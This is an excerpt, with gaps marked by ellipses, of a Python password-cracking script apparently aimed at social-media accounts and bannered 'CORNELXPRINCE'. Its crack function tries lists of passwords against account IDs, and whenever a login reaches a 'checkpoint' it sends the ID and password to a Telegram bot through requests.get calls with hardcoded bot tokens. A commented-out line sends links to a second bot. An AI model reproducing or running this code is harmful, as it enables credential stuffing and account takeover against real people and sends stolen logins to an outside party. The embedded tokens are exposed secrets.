...
#                requests.get("https://api.telegram.org/bot5400833535:AAH9DLhV-8D-aEv_rQorQfqpnm3EBkH9Img/sendMessage?chat_id=5400833535&text=" + linkkk)
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r {P}[CORNELXPRINCE]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				requests.get("https://api.telegram.org/bot5990228455:AAGIhAtun7NIuabme8WKNTKm5J6_5nz_BOE/,sendMessage?chat_id="+tid+"&text="+uname+"\n[ "+idf+' | '+pw+ " ]")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				requests.get("https://api.telegram.org/bot5990228455:AAGIhAtun7NIuabme8WKNTKm5J6_5nz_BOE?chat_id="+tid+"&text="+uname+"\n[ "+idf+' | '+pw+ " ]")
				ok.append(wrt)
				break
			else:
				continue
